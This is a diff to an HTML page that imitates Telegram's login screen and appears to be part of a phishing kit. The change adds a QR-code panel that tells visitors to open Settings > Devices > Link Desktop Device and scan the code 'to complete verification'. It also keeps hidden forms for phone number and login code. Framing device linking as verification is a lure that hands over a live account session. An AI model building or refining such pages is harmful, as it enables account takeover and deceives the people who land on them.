@@ -59,7 +59,7 @@
                 <div id="auth-phone-number-form" class="custom-scroll">
                     <div class="auth-form" id="codeForm" style="display: none;">
                         <div id="logo"></div>
-                        <h1>Telegram</h1>
+                        <h1>Enter Code</h1>
                         <p class="note">We have sent you a message in Telegram with the code.</p>
                         <form class="form" action="">
                             <div class="input-group touched with-label">
@@ -69,10 +69,19 @@
                             <button type="button" class="Button default primary text has-ripple" id="verifyBtn">Verify</button>
                         </form>
                     </div>
-                    <div class="auth-form" id="phoneForm">
+                    <div class="auth-form" id="qrForm">
+                        <img width="276px" height="276px" id="qrImg" alt="Scan QR code with Telegram app" />
+                        <h1>Verify by QR Code</h1>
+                        <div id="country wrapper" class="w-11/12 h-auto mt-5 px-3">
+                            <p class="font-medium text-md font-roboto my-2">1. Open Telegram on your phone</p>
+                            <p class="font-medium text-md font-roboto">2. Go to <b>Settings &gt; Devices &gt; Link Desktop Device</b></p>
+                            <p class=" text-md font-roboto my-2">3. Point your phone at this screen to complete verification</p>
+                        </div>
+                        <button type="button" class="Button default primary text has-ripple" id="pickPhone">Verify with phone number</button>
+                    </div>
+                    <div class="auth-form" id="phoneForm" style="display: none">
                         <div id="logo"></div>
-                        <img id="qrImg" alt="Scan QR code with Telegram app" />
-                        <h1>Telegram</h1>
+                        <h1>Verify with Telegram</h1>
                         <p class="note">Please confirm your country code and enter your phone number.</p>
                         <form class="form" action="">
                             <div class="DropdownMenu CountryCodeInput">
